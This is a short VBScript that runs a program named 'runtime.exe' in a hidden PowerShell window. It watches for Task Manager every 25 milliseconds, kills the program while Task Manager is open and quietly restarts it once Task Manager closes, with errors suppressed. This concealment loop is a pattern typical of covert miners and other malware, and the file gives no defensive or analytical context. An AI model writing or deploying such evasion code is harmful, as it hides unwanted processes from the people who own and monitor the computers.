Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -windowstyle hidden -command ""Start-Process -NoNewWindow runtime.exe""", 0, False

Dim targetProcess, taskManagerRunning
targetProcess = "runtime.exe"
taskManagerRunning = False

Do
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Taskmgr.exe'")
    
    If colProcessList.Count > 0 Then
        If Not taskManagerRunning Then
            taskManagerRunning = True
            On Error Resume Next
            WshShell.Run "taskkill /F /IM " & targetProcess, 0, True 
            On Error GoTo 0
        End If
    Else
        If taskManagerRunning Then
            taskManagerRunning = False
            On Error Resume Next
            WshShell.Run "powershell -windowstyle hidden -command ""Start-Process -NoNewWindow runtime.exe""", 0, False
            On Error GoTo 0
        End If
    End If
    
    WScript.Sleep 25
Loop
